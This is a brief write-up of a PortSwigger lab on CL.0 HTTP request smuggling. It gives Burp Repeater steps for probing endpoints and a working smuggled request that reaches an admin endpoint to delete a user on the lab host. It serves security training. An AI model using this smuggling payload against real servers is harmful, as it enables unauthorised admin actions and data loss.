# [CL.0 request smuggling] — [PortSwigger] — [Practitioner]
**Date:** 2026-06-26
 
---
 
## Vulnerability / core concept
HTTP Request Smuggling

---


## Payload / key command
To find the vulnerable endpoint we can use this guide from PortSwigger:

 Probe for vulnerable endpoints

    From the Proxy > HTTP history, send the GET / request to Burp Repeater twice.

    In Burp Repeater, add both of these tabs to a new group.

    Go to the first request and convert it to a POST request (right-click and select Change request method).

    In the body, add an arbitrary request smuggling prefix. The result should look something like this:
    POST / HTTP/1.1
    Host: YOUR-LAB-ID.web-security-academy.net
    Cookie: session=YOUR-SESSION-COOKIE
    Connection: close
    Content-Type: application/x-www-form-urlencoded
    Content-Length: CORRECT

    GET /hopefully404 HTTP/1.1
    Foo: x

    Change the path of the main POST request to point to an arbitrary endpoint that you want to test.

    Using the drop-down menu next to the Send button, change the send mode to Send group in sequence (single connection).

    Change the Connection header of the first request to keep-alive.

    Send the sequence and check the responses.

        If the server responds to the second request as normal, this endpoint is not vulnerable.

        If the response to the second request matches what you expected from the smuggled prefix (in this case, a 404 response), this indicates that the back-end server is ignoring the Content-Length of requests.

    Deduce that you can use requests for static files under /resources, such as /resources/images/blog.svg, to cause a CL.0 desync.

With this knowledge, we can use the following request to exploit admin functionality and delete user carlos:
```bash
POST /resources/labheader/js/labHeader.js HTTP/1.1
Host: 0a9b00b10385fbaa810b89fc00d10046.web-security-academy.net
Content-Length: 50

GET /admin/delete?username=carlos HTTP/1.1
Foo: x
```

